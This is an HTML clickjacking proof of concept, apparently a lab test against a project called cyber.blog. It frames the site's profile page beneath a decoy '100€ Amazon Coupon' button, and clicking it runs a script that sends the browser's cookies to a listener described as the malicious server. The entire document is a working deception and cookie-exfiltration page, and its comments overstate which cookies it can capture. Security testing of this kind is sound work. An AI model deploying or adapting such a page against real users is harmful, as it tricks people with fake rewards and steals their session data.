<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking Test</title>
    <style>
        body {
            padding: 0;
            margin: 0;
        }

        /* Iframe che carica la pagina del progetto cyber.blog */
        iframe {
            width: 100vw;
            height: 100vh;
            opacity: 0.5; /* Quasi invisibile: cambia a 0.5 per debug */
            position: absolute;
            z-index: 10;
        }

        /* Strato trasparente sopra l'iframe */
        #cover {
            width: 100vw;
            height: 100vh;
            position: absolute;
            z-index: 20;
        }

        /* Bottone esca */
        button {
            position: absolute;
            top: 40vh;
            right: 40vw;
            z-index: 30;
            padding: 10px;
            background-color: yellow;
            border-radius: 20px;
            height: 100px;
            width: 300px;
            animation: pulse 1.5s infinite;
            cursor: pointer;
            font-size: 18px;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.6);
            }
            50% {
                transform: scale(1.1);
                box-shadow: 0 0 20px rgba(0, 123, 255, 0.6);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.6);
            }
        }
    </style>
    <script>
        function sendCookies() {
            // Recupera i cookie del browser della vittima
            const cookies = document.cookie;

            // Invia i cookie al server malevolo in ascolto
            const xhr = new XMLHttpRequest();
            const url = 'http://localhost:8001/clickjacking/receive-cookie.php';

            // Apri una connessione
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Invia la richiesta con i cookie
            xhr.send('cookies=' + encodeURIComponent(cookies));
            // Notifica l'utente
            alert('Cookies sent!');
        }
    </script>
</head>
<body>
    <!-- <h1>Clickjacking Test Page</h1>
    <p>Questa pagina include un iframe con la tua applicazione.</p> -->

    <!-- Iframe che carica una pagina reale del progetto cyber.blog -->
    <iframe src="{{ url('/profile') }}"></iframe>

    <!-- Uno strato semi-trasparente sopra l'iframe -->
    <div id="cover"></div>

    <!-- Bottone esca: la vittima clicca qui pensando di vincere un coupon -->
    <button onclick="sendCookies()"><b>🎁 100€ Amazon Coupon</b></button>

</body>
</html>
